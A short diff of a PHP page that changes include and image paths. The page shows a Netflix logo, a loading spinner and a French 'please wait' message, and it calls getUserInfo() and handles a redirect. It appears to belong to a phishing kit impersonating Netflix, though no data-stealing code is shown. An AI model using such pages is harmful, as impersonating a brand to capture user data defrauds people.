@@ -1,7 +1,7 @@
 <?php
 session_start();
-include "./zebi/config.php";
-include "./zebi/functions.php";
+include "config.php";
+include "functions.php";
 
 $user_info = getUserInfo();
 $timestamp = getCurrentTimestamp();
@@ -103,7 +103,7 @@ if (!empty($redirect_to)) {
 </head>
 <body>
     <div class="logo">
-        <img src="files/img/Logonetflix.png" alt="Netflix Logo">
+        <img src="Logonetflix.png" alt="Netflix Logo">
     </div>
     <div class="loading-spinner"></div>
     <p>Veuillez patienter pendant que nous traitons votre demande...</p>
